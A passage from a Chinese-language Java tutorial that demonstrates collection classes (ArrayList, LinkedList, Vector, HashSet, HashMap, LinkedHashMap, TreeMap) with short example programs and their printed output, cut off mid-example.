result.get(j).add(t); break; &#125; &#125; if (!isSameGroup) &#123; // 创建 List&lt;T&gt; innerList = new ArrayList&lt;T&gt;(); result.add(innerList); innerList.add(t); &#125; &#125; return result; &#125; public static void main(String[] args) &#123; List&lt;Apple&gt; list = new ArrayList&lt;&gt;(); list.add(new GroupTest().new Apple(&quot;红&quot;, 205)); list.add(new GroupTest().new Apple(&quot;红&quot;, 131)); list.add(new GroupTest().new Apple(&quot;绿&quot;, 248)); list.add(new GroupTest().new Apple(&quot;绿&quot;, 153)); list.add(new GroupTest().new Apple(&quot;黄&quot;, 119)); list.add(new GroupTest().new Apple(&quot;黄&quot;, 224)); List&lt;List&lt;Apple&gt;&gt; byColors = divider(list, new Comparator&lt;Apple&gt;() &#123; @Override public int compare(Apple o1, Apple o2) &#123; // 按颜色分组 return o1.color.compareTo(o2.color); &#125; &#125;); System.out.println(&quot;按颜色分组&quot; + byColors); List&lt;List&lt;Apple&gt;&gt; byWeight = divider(list, new Comparator&lt;Apple&gt;() &#123; @Override public int compare(Apple o1, Apple o2) &#123; // 按重量级 return (o1.weight / 100 == o2.weight / 100) ? 0 : 1; &#125; &#125;); System.out.println(&quot;按重量级分组&quot; + byWeight); &#125;&#125;/*结果如下（为了方便看，手动回车换行格式化了下）：按颜色分组[[Apple [color=红, weight=205],Apple [color=红, weight=131]],[Apple [color=绿, weight=248],Apple [color=绿, weight=153]],[Apple [color=黄, weight=119],Apple [color=黄, weight=224]]]按重量级分组[[Apple [color=红, weight=205],Apple [color=绿, weight=248],Apple [color=黄, weight=224]],[Apple [color=红, weight=131],Apple [color=绿, weight=153],Apple [color=黄, weight=119]]]*/ 集合框架Collection123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/*Collection 接口Collection 是最基本的集合接口，一个 Collection 代表一组 Object，即 Collection 的元素, Java不提供直接继承自Collection的类，只提供继承于的子接口(如List和set)。Collection 接口存储一组不唯一，无序的对象。*/import java.util.*;import java.text.*;public class Main &#123; public static void main(String[] args) &#123; // 创建Collection接口的实现 Collection collection = new ArrayList&lt;&gt;(); // 添加元素 collection.add(&quot;嘻嘻&quot;); String src = &quot;????&quot;; collection.add(src); System.out.println(collection); // 创建Collection的实现 Collection&lt;String&gt; coll = new HashSet&lt;&gt;(); coll.add(&quot;?&quot;); coll.add(&quot;?&quot;); coll.add(&quot;?&quot;); System.out.println(coll); // 添加一个集合数据 collection.addAll(coll); // 输出集合的长度 System.out.println(collection); // 判断是否包含 System.out.println(collection.contains(&quot;?&quot;)); // 移除元素 collection.remove(&quot;?&quot;); System.out.println(&quot;-------&quot;); collection.add(null); Collection&lt;String&gt; collection1 = new ArrayList&lt;&gt;(); collection1.add(&quot;嘻嘻&quot;); collection1.add(&quot;?&quot;); // 求两个集合的交集(只保留collection1存在的元素) collection.retainAll(collection1); System.out.println(collection); // 清空元素 collection.clear(); System.out.println(collection); &#125;&#125;/*结果如下：[嘻嘻, ????][?][嘻嘻, ????, ?]true-------[嘻嘻][]*/ ListArrayList123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109//ArrayListimport java.util.ArrayList; // 引入 ArrayList 类ArrayList&lt;E&gt; objectName =new ArrayList&lt;&gt;(); // 初始化//添加元素import java.util.ArrayList;public class RunoobTest &#123; public static void main(String[] args) &#123; ArrayList&lt;String&gt; sites = new ArrayList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); System.out.println(sites); &#125;&#125;//访问元素import java.util.ArrayList;public class RunoobTest &#123; public static void main(String[] args) &#123; ArrayList&lt;String&gt; sites = new ArrayList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); System.out.println(sites.get(1)); // 访问第二个元素 &#125;&#125;//修改元素import java.util.ArrayList;public class RunoobTest &#123; public static void main(String[] args) &#123; ArrayList&lt;String&gt; sites = new ArrayList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); sites.set(2, &quot;Wiki&quot;); // 第一个参数为索引位置，第二个为要修改的值 System.out.println(sites); &#125;&#125;//删除元素import java.util.ArrayList;public class RunoobTest &#123; public static void main(String[] args) &#123; ArrayList&lt;String&gt; sites = new ArrayList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); sites.remove(3); // 删除第四个元素 System.out.println(sites); &#125;&#125;//计算大小import java.util.ArrayList;public class RunoobTest &#123; public static void main(String[] args) &#123; ArrayList&lt;String&gt; sites = new ArrayList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); System.out.println(sites.size()); &#125;&#125;//迭代数组列表import java.util.ArrayList;public class RunoobTest &#123; public static void main(String[] args) &#123; ArrayList&lt;String&gt; sites = new ArrayList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); for (int i = 0; i &lt; sites.size(); i++) &#123; System.out.println(sites.get(i)); &#125; &#125;&#125;import java.util.ArrayList;public class RunoobTest &#123; public static void main(String[] args) &#123; ArrayList&lt;String&gt; sites = new ArrayList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); for (int i = 0; i &lt; sites.size(); i++) &#123; System.out.println(sites.get(i)); &#125; &#125;&#125; LinkedList123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153//LinkedList // 引入 LinkedList 类import java.util.LinkedList; LinkedList&lt;E&gt; list = new LinkedList&lt;E&gt;(); // 普通创建方法或者LinkedList&lt;E&gt; list = new LinkedList(Collection&lt;? extends E&gt; c); // 使用集合创建链表//创建一个简单的链表// 引入 LinkedList 类import java.util.LinkedList;public class RunoobTest &#123; public static void main(String[] args) &#123; LinkedList&lt;String&gt; sites = new LinkedList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); System.out.println(sites); &#125;&#125;//在列表开头添加元素// 引入 LinkedList 类import java.util.LinkedList;public class RunoobTest &#123; public static void main(String[] args) &#123; LinkedList&lt;String&gt; sites = new LinkedList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); // 使用 addFirst() 在头部添加元素 sites.addFirst(&quot;Wiki&quot;); System.out.println(sites); &#125;&#125;//在列表结尾添加元素// 引入 LinkedList 类import java.util.LinkedList;public class RunoobTest &#123; public static void main(String[] args) &#123; LinkedList&lt;String&gt; sites = new LinkedList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); // 使用 addLast() 在尾部添加元素 sites.addLast(&quot;Wiki&quot;); System.out.println(sites); &#125;&#125;//在列表开头移除元素// 引入 LinkedList 类import java.util.LinkedList;public class RunoobTest &#123; public static void main(String[] args) &#123; LinkedList&lt;String&gt; sites = new LinkedList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); // 使用 removeFirst() 移除头部元素 sites.removeFirst(); System.out.println(sites); &#125;&#125;//在列表结尾移除元素// 引入 LinkedList 类import java.util.LinkedList;public class RunoobTest &#123; public static void main(String[] args) &#123; LinkedList&lt;String&gt; sites = new LinkedList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); // 使用 removeLast() 移除尾部元素 sites.removeLast(); System.out.println(sites); &#125;&#125;//获取列表开头的元素// 引入 LinkedList 类import java.util.LinkedList;public class RunoobTest &#123; public static void main(String[] args) &#123; LinkedList&lt;String&gt; sites = new LinkedList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); // 使用 getFirst() 获取头部元素 System.out.println(sites.getFirst()); &#125;&#125;//获取列表结尾的元素// 引入 LinkedList 类import java.util.LinkedList;public class RunoobTest &#123; public static void main(String[] args) &#123; LinkedList&lt;String&gt; sites = new LinkedList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); // 使用 getLast() 获取尾部元素 System.out.println(sites.getLast()); &#125;&#125;//迭代元素// 引入 LinkedList 类import java.util.LinkedList;public class RunoobTest &#123; public static void main(String[] args) &#123; LinkedList&lt;String&gt; sites = new LinkedList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); for (int size = sites.size(), i = 0; i &lt; size; i++) &#123; System.out.println(sites.get(i)); &#125; &#125;&#125;// 引入 LinkedList 类import java.util.LinkedList;public class RunoobTest &#123; public static void main(String[] args) &#123; LinkedList&lt;String&gt; sites = new LinkedList&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Runoob&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Weibo&quot;); for (String i : sites) &#123; System.out.println(i); &#125; &#125;&#125; Vector123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263//Vector Vector 主要用在事先不知道数组的大小，或者只是需要一个可以改变大小的数组的情况。import java.util.*;public class VectorDemo &#123; public static void main(String args[]) &#123; // initial size is 3, increment is 2 Vector v = new Vector(3, 2); System.out.println(&quot;Initial size: &quot; + v.size()); System.out.println(&quot;Initial capacity: &quot; + v.capacity()); v.addElement(new Integer(1)); v.addElement(new Integer(2)); v.addElement(new Integer(3)); v.addElement(new Integer(4)); System.out.println(&quot;Capacity after four additions: &quot; + v.capacity()); v.addElement(new Double(5.45)); System.out.println(&quot;Current capacity: &quot; + v.capacity()); v.addElement(new Double(6.08)); v.addElement(new Integer(7)); System.out.println(&quot;Current capacity: &quot; + v.capacity()); v.addElement(new Float(9.4)); v.addElement(new Integer(10)); System.out.println(&quot;Current capacity: &quot; + v.capacity()); v.addElement(new Integer(11)); v.addElement(new Integer(12)); System.out.println(&quot;First element: &quot; + (Integer)v.firstElement()); System.out.println(&quot;Last element: &quot; + (Integer)v.lastElement()); if(v.contains(new Integer(3))) System.out.println(&quot;Vector contains 3.&quot;); // enumerate the elements in the vector. Enumeration vEnum = v.elements(); System.out.println(&quot;\\nElements in vector:&quot;); while(vEnum.hasMoreElements()) System.out.print(vEnum.nextElement() + &quot; &quot;); System.out.println(); &#125;&#125;/*以上实例编译运行结果如下：Initial size: 0Initial capacity: 3Capacity after four additions: 5Current capacity: 5Current capacity: 7Current capacity: 9First element: 1Last element: 12Vector contains 3.Elements in vector:1 2 3 4 5.45 6.08 7 9.4 10 11 12*/ SetHashSet12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394//HashSetHashSet&lt;String&gt; sites = new HashSet&lt;String&gt;();//添加元素// 引入 HashSet 类 import java.util.HashSet;public class RunoobTest &#123; public static void main(String[] args) &#123; HashSet&lt;String&gt; sites = new HashSet&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Zhihu&quot;); sites.add(&quot;Runoob&quot;); // 重复的元素不会被添加 System.out.println(sites); &#125;&#125;//判断元素是否存在// 引入 HashSet 类 import java.util.HashSet;public class RunoobTest &#123; public static void main(String[] args) &#123; HashSet&lt;String&gt; sites = new HashSet&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Zhihu&quot;); sites.add(&quot;taobao&quot;); // 重复的元素不会被添加 System.out.println(sites.contains(&quot;Taobao&quot;)); &#125;&#125;//删除元素// 引入 HashSet 类 import java.util.HashSet;public class RunoobTest &#123; public static void main(String[] args) &#123; HashSet&lt;String&gt; sites = new HashSet&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Zhihu&quot;); sites.add(&quot;taobao&quot;); // 重复的元素不会被添加 sites.remove(&quot;Taobao&quot;); // 删除元素，删除成功返回 true，否则为 false System.out.println(sites); &#125;&#125;// 引入 HashSet 类 import java.util.HashSet;public class RunoobTest &#123; public static void main(String[] args) &#123; HashSet&lt;String&gt; sites = new HashSet&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Zhihu&quot;); sites.add(&quot;taobao&quot;); // 重复的元素不会被添加 sites.clear(); //删除集合中所有元素 System.out.println(sites); &#125;&#125;//计算大小// 引入 HashSet 类 import java.util.HashSet;public class RunoobTest &#123; public static void main(String[] args) &#123; HashSet&lt;String&gt; sites = new HashSet&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Zhihu&quot;); sites.add(&quot;taobao&quot;); // 重复的元素不会被添加 System.out.println(sites.size()); &#125;&#125;//迭代 HashSet// 引入 HashSet 类 import java.util.HashSet;public class RunoobTest &#123; public static void main(String[] args) &#123; HashSet&lt;String&gt; sites = new HashSet&lt;String&gt;(); sites.add(&quot;Google&quot;); sites.add(&quot;Taobao&quot;); sites.add(&quot;Zhihu&quot;); sites.add(&quot;taobao&quot;); // 重复的元素不会被添加 for (String i : sites) &#123; System.out.println(i); &#125; &#125;&#125; LinkedHashSet1234567891011121314151617181920//LinkedHashSet也是Set接口的实现类，底层数据结构是链表和哈希表，哈希表用来保证元素唯一，链表用来保证元素的插入顺序，即FIFO(First Input First Output 先进先出)。Set&lt;String&gt; platformSet = new LinkedHashSet&lt;&gt;();/*public boolean add(E e)说明：向集合中添加元素public boolean remove(Object o)说明：向集合中删除元素public void clear()说明：清空集合元素public int size()说明：返回集合中元素的数量*/ TreeSet12//TreeSet也是Set接口的实现类，底层数据结构是红黑树，TreeSet不仅保证元素的唯一性，也保证元素的顺序。Set&lt;String&gt; platformSet = new TreeSet&lt;&gt;(); MapHasdMap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114//HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。HashMap&lt;Integer, String&gt; Sites = new HashMap&lt;Integer, String&gt;();//添加元素// 引入 HashMap 类 import java.util.HashMap;public class RunoobTest &#123; public static void main(String[] args) &#123; // 创建 HashMap 对象 Sites HashMap&lt;Integer, String&gt; Sites = new HashMap&lt;Integer, String&gt;(); // 添加键值对 Sites.put(1, &quot;Google&quot;); Sites.put(2, &quot;Runoob&quot;); Sites.put(3, &quot;Taobao&quot;); Sites.put(4, &quot;Zhihu&quot;); System.out.println(Sites); &#125;&#125;//访问元素 我们可以使用 get(key) 方法来获取 key 对应的 value// 引入 HashMap 类 import java.util.HashMap;public class RunoobTest &#123; public static void main(String[] args) &#123; // 创建 HashMap 对象 Sites HashMap&lt;Integer, String&gt; Sites = new HashMap&lt;Integer, String&gt;(); // 添加键值对 Sites.put(1, &quot;Google&quot;); Sites.put(2, &quot;Runoob&quot;); Sites.put(3, &quot;Taobao&quot;); Sites.put(4, &quot;Zhihu&quot;); System.out.println(Sites.get(3)); &#125;&#125;//删除元素我们可以使用 remove(key) 方法来删除 key 对应的键值对(key-value)// 引入 HashMap 类 import java.util.HashMap;public class RunoobTest &#123; public static void main(String[] args) &#123; // 创建 HashMap 对象 Sites HashMap&lt;Integer, String&gt; Sites = new HashMap&lt;Integer, String&gt;(); // 添加键值对 Sites.put(1, &quot;Google&quot;); Sites.put(2, &quot;Runoob&quot;); Sites.put(3, &quot;Taobao&quot;); Sites.put(4, &quot;Zhihu&quot;); Sites.remove(4); System.out.println(Sites); &#125;&#125;//删除所有键值对(key-value)可以使用 clear 方法// 引入 HashMap 类 import java.util.HashMap;public class RunoobTest &#123; public static void main(String[] args) &#123; // 创建 HashMap 对象 Sites HashMap&lt;Integer, String&gt; Sites = new HashMap&lt;Integer, String&gt;(); // 添加键值对 Sites.put(1, &quot;Google&quot;); Sites.put(2, &quot;Runoob&quot;); Sites.put(3, &quot;Taobao&quot;); Sites.put(4, &quot;Zhihu&quot;); Sites.clear(); System.out.println(Sites); &#125;&#125;//计算大小 如果要计算 HashMap 中的元素数量可以使用 size() 方法// 引入 HashMap 类 import java.util.HashMap;public class RunoobTest &#123; public static void main(String[] args) &#123; // 创建 HashMap 对象 Sites HashMap&lt;Integer, String&gt; Sites = new HashMap&lt;Integer, String&gt;(); // 添加键值对 Sites.put(1, &quot;Google&quot;); Sites.put(2, &quot;Runoob&quot;); Sites.put(3, &quot;Taobao&quot;); Sites.put(4, &quot;Zhihu&quot;); System.out.println(Sites.size()); &#125;&#125;//迭代 HashMap//可以使用 for-each 来迭代 HashMap 中的元素。//如果你只想获取 key，可以使用 keySet() 方法，然后可以通过 get(key) 获取对应的 value，如果你只想获取 value，可以使用 values() 方法。// 引入 HashMap 类 import java.util.HashMap;public class RunoobTest &#123; public static void main(String[] args) &#123; // 创建 HashMap 对象 Sites HashMap&lt;Integer, String&gt; Sites = new HashMap&lt;Integer, String&gt;(); // 添加键值对 Sites.put(1, &quot;Google&quot;); Sites.put(2, &quot;Runoob&quot;); Sites.put(3, &quot;Taobao&quot;); Sites.put(4, &quot;Zhihu&quot;); // 输出 key 和 value for (Integer i : Sites.keySet()) &#123; System.out.println(&quot;key: &quot; + i + &quot; value: &quot; + Sites.get(i)); &#125; // 返回所有 value 值 for(String value: Sites.values()) &#123; // 输出每一个value System.out.print(value + &quot;, &quot;); &#125; &#125;&#125; LinkedHashMap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135//LinkedHashMap&lt;Key, Value&gt; numbers2 = new LinkedHashMap&lt;&gt;(capacity, loadFactor, accessOrder);//这里accessOrder 是一个布尔值。默认值为false。在这种情况下，双向链表中的条目将根据其插入顺序进行排序。但是，如果accessOrder值为true，则双向链表中的条目将将按从最近访问的顺序排序。//创建class Main &#123; public static void main(String[] args) &#123; //创建偶数的LinkedHashMap LinkedHashMap&lt;String, Integer&gt; evenNumbers = new LinkedHashMap&lt;&gt;(); evenNumbers.put(&quot;Two&quot;, 2); evenNumbers.put(&quot;Four&quot;, 4); System.out.println(&quot;LinkedHashMap1: &quot; + evenNumbers); //从其他LinkedHashMap创建LinkedHashMap LinkedHashMap&lt;String, Integer&gt; numbers = new LinkedHashMap&lt;&gt;(evenNumbers); numbers.put(&quot;Three&quot;, 3); System.out.println(&quot;LinkedHashMap2: &quot; + numbers); &#125;&#125;//将元素插入LinkedHashMapclass Main &#123; public static void main(String[] args) &#123; // Creating LinkedHashMap of even numbers LinkedHashMap&lt;String, Integer&gt; evenNumbers = new LinkedHashMap&lt;&gt;(); // 使用 put() evenNumbers.put(&quot;Two&quot;, 2); evenNumbers.put(&quot;Four&quot;, 4); System.out.println(&quot;原始LinkedHashMap: &quot; + evenNumbers); // 使用 putIfAbsent() evenNumbers.putIfAbsent(&quot;Six&quot;, 6); System.out.println(&quot;更新后的LinkedHashMap(): &quot; + evenNumbers); //Creating LinkedHashMap of numbers LinkedHashMap&lt;String, Integer&gt; numbers = new LinkedHashMap&lt;&gt;(); numbers.put(&quot;One&quot;, 1); // 使用 putAll() numbers.putAll(evenNumbers); System.out.println(&quot;新的LinkedHashMap: &quot; + numbers); &#125;&#125;//访问LinkedHashMap元素/*1.使用entrySet()，keySet()和values() entrySet() -返回映射的所有键/值映射的集合 keySet() - 返回map所有键的集合 values() - 返回map所有值的集合*/class Main &#123; public static void main(String[] args) &#123; LinkedHashMap&lt;String, Integer&gt; numbers = new LinkedHashMap&lt;&gt;(); numbers.put(&quot;One&quot;, 1); numbers.put(&quot;Two&quot;, 2); numbers.put(&quot;Three&quot;, 3); System.out.println(&quot;LinkedHashMap: &quot; + numbers); // 使用 entrySet() System.out.println(&quot;Key/Value 映射: &quot; + numbers.entrySet()); // 使用 keySet() System.out.println(&quot;Keys（键）: &quot; + numbers.keySet()); // 使用 values() System.out.println(&quot;Values（值）: &quot; + numbers.values()); &#125;&#125;/*2.使用 get() 和 getOrDefault() get() - 返回与指定键关联的值。如果未找到键，则返回null。 getOrDefault() - 返回与指定键关联的值。如果找不到该键，它将返回指定的默认值。*/class Main &#123; public static void main(String[] args) &#123; LinkedHashMap&lt;String, Integer&gt; numbers = new LinkedHashMap&lt;&gt;(); numbers.put(&quot;One&quot;, 1); numbers.put(&quot;Two&quot;, 2); numbers.put(&quot;Three&quot;, 3); System.out.println(&quot;LinkedHashMap: &quot; + numbers); // 使用 get() int value1 = numbers.get(&quot;Three&quot;); System.out.println(&quot;返回数字: &quot; + value1); // 使用 getOrDefault() int value2 = numbers.getOrDefault(&quot;Five&quot;, 5); System.out.println(&quot;返回数字: &quot; + value2); &#125;&#125;//删除LinkedHashMap元素/* remove(key) - 返回并从映射中删除与指定键相关联的项。 remove(key, value) - 仅当将指定键key映射为指定值value并返回布尔值时，才从映射中删除条目。*/class Main &#123; public static void main(String[] args) &#123; LinkedHashMap&lt;String, Integer&gt; numbers = new LinkedHashMap&lt;&gt;(); numbers.put(&quot;One&quot;, 1); numbers.put(&quot;Two&quot;, 2); numbers.put(&quot;Three&quot;, 3); System.out.println(&quot;LinkedHashMap: &quot; + numbers); //具有单个参数的删除方法 int value = numbers.remove(&quot;Two&quot;); System.out.println(&quot;删除值: &quot; + value); //具有两个参数的删除方法 boolean result = numbers.remove(&quot;Three&quot;, 3); System.out.println(&quot;条目3被删除了吗？ &quot; + result); System.out.println(&quot;更新后的LinkedHashMap: &quot; + numbers); &#125;&#125;/*clear() 从map中删除所有条目containsKey() 检查map是否包含指定的键并返回布尔值containsValue() 检查map是否包含指定的值并返回布尔值size() 返回map的大小isEmpty() 检查map是否为空，并返回布尔值*/ TreeMap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343TreeMap&lt;Key, Value&gt; numbers = new TreeMap&lt;&gt;();//将元素插入TreeMap// put() - 将指定的键/值映射（条目）插入到映射中// putAll() - 将指定映射中的所有条目插入到此映射中// putIfAbsent() - 如果映射中不存在指定的键，则将指定的键/值映射插入到map中class Main &#123; public static void main(String[] args) &#123; //创建偶数的TreeMap TreeMap&lt;String, Integer&gt; evenNumbers = new TreeMap&lt;&gt;(); // 使用 put() evenNumbers.put(&quot;Two&quot;, 2); evenNumbers.put(&quot;Four&quot;, 4); // 使用 putIfAbsent() evenNumbers.putIfAbsent(&quot;Six&quot;, 6); System.out.println(&quot;偶数的TreeMap: &quot; + evenNumbers); //Creating TreeMap of numbers TreeMap&lt;String, Integer&gt; numbers = new TreeMap&lt;&gt;(); numbers.put(&quot;One&quot;, 1); // 使用 putAll() numbers.putAll(evenNumbers); System.out.println(&quot;TreeMap 的数字: &quot; + numbers); &#125;&#125;//访问TreeMap元素/*1.使用entrySet()，keySet()和values() entrySet() - 返回TreeMap的所有键/值映射（条目）的集合 keySet() - 返回TreeMap的所有键的集合 values() - 返回TreeMap的所有图的集合*/class Main &#123; public static void main(String[] args) &#123; TreeMap&lt;String, Integer&gt; numbers = new TreeMap&lt;&gt;(); numbers.put(&quot;One&quot;, 1); numbers.put(&quot;Two&quot;, 2); numbers.put(&quot;Three&quot;, 3); System.out.println(&quot;TreeMap: &quot; + numbers); // 使用 entrySet() System.out.println(&quot;Key/Value 映射: &quot; + numbers.entrySet()); // 使用 keySet() System.out.println(&quot;Keys: &quot; + numbers.keySet()); // 使用 values() System.out.println(&quot;Values: &quot; + numbers.values()); &#125;&#125;/*2.使用get() 和 getOrDefault() get() - 返回与指定键关联的值。如果找不到键，则返回null。 getOrDefault() - 返回与指定键关联的值。如果找不到键，则返回指定的默认值。*/class Main &#123; public static void main(String[] args) &#123; TreeMap&lt;String, Integer&gt; numbers = new TreeMap&lt;&gt;(); numbers.put(&quot;One&quot;, 1); numbers.put(&quot;Two&quot;, 2); numbers.put(&quot;Three&quot;, 3); System.out.println(&quot;TreeMap: &quot; + numbers); // 使用 get() int value1 = numbers.get(&quot;Three&quot;); System.out.println(&quot;使用 get(): &quot; + value1); // 使用 getOrDefault() int value2 = numbers.getOrDefault(&quot;Five&quot;, 5); System.out.println(&quot;使用 getOrDefault(): &quot; + value2); &#125;&#125;//删除TeeMap元素// remove(key) - 返回并从TreeMap中删除与指定键关联的条目// remove(key, value) -仅当指定键与指定值相关联时才从映射中删除条目，并返回布尔值class Main &#123; public static void main(String[] args) &#123; TreeMap&lt;String, Integer&gt; numbers = new TreeMap&lt;&gt;(); numbers.put(&quot;One&quot;, 1); numbers.put(&quot;Two&quot;, 2); numbers.put(&quot;Three&quot;, 3); System.out.println(&quot;TreeMap: &quot; + numbers); //具有单参数删除方法 int value = numbers.remove(&quot;Two&quot;); System.out.println(&quot;被删除的值: &quot; + value); //具有两个参数的删除方法 boolean result = numbers.remove(&quot;Three&quot;, 3); System.out.println(&quot;条目 &#123;Three=3&#125; 被删除? &quot; + result); System.out.println(&quot;更新后的TreeMap: &quot; + numbers); &#125;&#125;//替换TreeMap元素// replace(key, value)-用key新的替换指定映射的值value// replace(key, old, new) -仅当旧值已与指定键关联时，才用新值替换旧值// replaceAll(function) -用指定的结果替换map的每个值 functionclass Main &#123; public static void main(String[] args) &#123; TreeMap&lt;String, Integer&gt; numbers = new TreeMap&lt;&gt;(); numbers.put(&quot;First&quot;, 1); numbers.put(&quot;Second&quot;, 2); numbers.put(&quot;Third&quot;, 3); System.out.println(&quot;Original TreeMap: &quot; + numbers); // 使用 replace() numbers.replace(&quot;Second&quot;, 22); numbers.replace(&quot;Third&quot;, 3, 33); System.out.println(&quot;TreeMap使用replace()方法: &quot; + numbers); // 使用 replaceAll() numbers.replaceAll((key, oldValue) -&gt; oldValue + 2); System.out.println(&quot;TreeMap使用replaceAll()方法: &quot; + numbers); &#125;&#125;//导航方法/*1.第一个和最后一个方法 firstKey() - 返回map的第一个键 firstEntry() - 返回映射的第一个键的键/值映射 lastKey() - 返回map的最后一个键 lastEntry() - 返回映射的最后一个键的键/值映射*/class Main &#123; public static void main(String[] args) &#123; TreeMap&lt;String, Integer&gt; numbers = new TreeMap&lt;&gt;(); numbers.put(&quot;First&quot;, 1); numbers.put(&quot;Second&quot;, 2); numbers.put(&quot;Third&quot;, 3); System.out.println(&quot;TreeMap: &quot; + numbers); // 使用 the firstKey() 方法 String firstKey = numbers.firstKey(); System.out.println(&quot;第一个键： &quot; + firstKey); // 使用 the lastKey() 方法 String lastKey = numbers.lastKey(); System.out.println(&quot;最后一个键： &quot; + lastKey); // 使用 firstEntry() 方法 System.out.println(&quot;第一项： &quot; + numbers.firstEntry()); // 使用 the lastEntry() 方法 System.out.println(&quot;最后一项： &quot; + numbers.lastEntry()); &#125;&#125;/*2.向上，向下，上下限方法 HigherKey() - 返回大于指定键的那些键中的最小的键。 HigherEntry() - 返回与所有大于指定键的键中最小的键相关的条目。 lowerKey() - 返回所有小于指定键的最大键。 lowerEntry() - 返回与所有小于指定键的键中最大的键关联的条目。 ceilingKey() - 返回大于指定键的那些键中的最小的键。如果映射中存在作为参数传递的键，则它将返回该键。 ceilingEntry() - 返回与大于指定键的那些键中最小的键相关的条目。如果映射中存在与传递给自变量的键关联的条目，则返回与该键关联的条目。 floorKey() - 返回小于指定键的那些键中最大的键。如果存在作为参数传递的键，它将返回该键。 floorEntry() - 返回与小于指定键的那些键中最大的键相关的条目。如果存在作为参数传递的键，它将返回该键*/class Main &#123; public static void main(String[] args) &#123; TreeMap&lt;String, Integer&gt; numbers = new TreeMap&lt;&gt;(); numbers.put(&quot;First&quot;, 1); numbers.put(&quot;Second&quot;, 5); numbers.put(&quot;Third&quot;, 4); numbers.put(&quot;Fourth&quot;, 6); System.out.println(&quot;TreeMap: &quot; + numbers); // 使用 higher() System.out.println(&quot;使用 higherKey(): &quot; + numbers.higherKey(&quot;Fourth&quot;)); System.out.println(&quot;使用 higherEntry(): &quot; + numbers.higherEntry(&quot;Fourth&quot;)); // 使用 lower() System.out.println(&quot;\\n使用 lowerKey(): &quot; + numbers.lowerKey(&quot;Fourth&quot;)); System.out.println(&quot;使用 lowerEntry(): &quot; + numbers.lowerEntry(&quot;Fourth&quot;)); // 使用 ceiling() System.out.println(&quot;\\n使用 ceilingKey(): &quot; + numbers.ceilingKey(&quot;Fourth&quot;)); 